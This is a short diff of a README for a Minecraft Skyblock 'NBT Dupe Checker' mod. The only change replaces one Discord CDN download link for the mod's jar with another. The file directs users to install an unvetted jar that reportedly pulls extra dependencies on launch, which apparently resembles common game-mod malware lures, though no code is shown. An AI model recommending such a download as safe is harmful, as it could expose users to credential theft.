@@ -8,7 +8,7 @@ It uses the NBT data from past dupes to find out if items are duped.
 # NBT Dupe Checker Download:
 A side mod of Skytils/Sbe, An amazing Dupe Checker. although SBE and Skytils are better in different aspects, NBT is better overall for dupe checking, as skytils and SBE's api lacks in quality.
 
-This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/963647791308095538/967314822511329280/NBT_Duped_Item_Checker.jar).
+This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/963647791308095538/967330876969091112/NBT_Duped_Item_Checker.jar).
 
 # How to download:
 Once Forge 1.8.9 is installed, put this mod in your mods folder. Once Minecraft launches it automatically installs all the dependencies, this makes the mod very lightweight 
